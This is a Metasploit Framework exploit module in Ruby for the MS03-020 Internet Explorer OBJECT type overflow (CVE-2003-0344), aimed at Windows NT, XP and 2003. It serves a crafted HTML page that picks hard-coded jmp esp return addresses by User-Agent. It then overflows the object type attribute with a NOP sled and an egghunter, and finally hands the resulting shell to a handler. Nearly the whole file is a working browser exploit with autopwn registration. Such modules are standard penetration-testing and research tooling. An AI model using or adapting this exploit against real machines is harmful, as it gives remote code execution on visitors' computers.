##
# $Id: ms03_020_ie_objecttype.rb 10150 2010-08-25 20:55:37Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::Remote::Egghunter

	include Msf::Exploit::Remote::BrowserAutopwn
	autopwn_info({
		:ua_name      => HttpClients::IE,
		:javascript   => false,
		:os_name      => OperatingSystems::WINDOWS,
		:vuln_test    => nil, # no way to test without just trying it
		:prefix_html  => "<!--[if lt IE 7]>",
		:postfix_html => "<![endif]-->",
		:rank         => NormalRanking  # reliable memory corruption
	})

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'MS03-020 Internet Explorer Object Type',
			'Description'    => %q{
					This module exploits a vulnerability in Internet Explorer's
				handling of the OBJECT type attribute.
			},
			'Author'         => 'skape',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10150 $',
			'References'     =>
				[
					[ 'CVE', '2003-0344' ],
					[ 'OSVDB', '2967'    ],
					[ 'BID', '7806'      ],
					[ 'MSB', 'MS03-020'  ],
				],
			'Payload'        =>
				{
					'Space'    => 1000,
					'MaxNops'  => 0,
					'BadChars' => "\x8b\xe2", # Prevent UTF-8-ification
					'StackAdjustment' => -3500,
				},
			'Targets'        =>
				[
					# Target 0: Automatic
					[
						'Windows NT/XP/2003 Automatic',
						{
							'Platform' => 'win',
							'Rets'     =>
								[
									0x777e85ab, # Windows NT: samlib jmp esp
									0x71ab1d54, # Windows XP: ws2_32 push esp/ret SP0/1
									0x77d1f92f, # Windows 2003: user32 jmp esp SP0/1
								],
						},
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jun 04 2003'))
	end

	def on_request_uri(cli, request)
		clean = 0x7ffdec50
		ret   = nil

		# Figure out which return address to use based on the user-agent
		case request['User-Agent']
			when /Windows NT 5.2/
				ret = target['Rets'][2]
			when /Windows NT 5.1/
				ret = target['Rets'][1]
			when /Windows NT/
				ret = target['Rets'][0]
			else
				print_status("Sending 404 to user agent: #{request['User-Agent']}")
				cli.send_response(create_response(404, 'File not found'))
				return
		end

		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Pack the values
		ret    = [ ret   ].pack('V')
		clean  = [ clean ].pack('V')
		hunter = generate_egghunter(p.encoded, payload_badchars, { :checksum => true })
		egg    = hunter[1]

		# Now, build out the HTTP response payload
		content =
			"<html>" + egg + "\n" +
			"<object type=\"////////////////////////////////////////////////////////////////" +
			rand_text_alphanumeric(8) + ret + clean +
			make_nops(8) + hunter[0] + "\">" +
			"</object>" +
			"</html>"

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end